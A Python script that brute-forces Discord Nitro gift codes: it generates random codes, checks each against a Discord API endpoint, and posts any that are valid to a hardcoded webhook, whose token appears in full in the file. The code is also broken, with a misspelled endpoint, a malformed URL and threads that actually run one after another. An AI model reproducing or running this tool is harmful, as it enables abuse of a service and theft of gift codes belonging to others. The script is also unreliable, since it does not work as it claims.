import string
from dhooks import Webhook
import threading
import random
import requests
import discord


hook = Webhook('https://discord.com/api/webhooks/1058644298574348288'
               '/VzlsrSuxCJLOhxN2Jdk1p_baVI5wXa9JFyXgEZHPbtUHTo2yvQZX2mq9dpPMUimpnmt4')

hook.send("Starting!")


def gen(n):
    count = 0
    for _ in range(n):
        generated = f"https://discord.gift/{''.join(random.choice(string.ascii_uppercase+string.digits+string.ascii_lowercase) for _ in range(19))}"
        url = "https://discordapp.com/api/v6/entitelemnts/gift-codes" + generated + "?with_application=false&with_subscription_plan=true"

        req = requests.get(url)

        if req.status_code == 200:
            hook.send(generated)
            print(generated)
            count += 1


if __name__ == "__main__":
    threads = []

    for i in range(0, 10):
        thread = threading.Thread(target=gen(1000))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
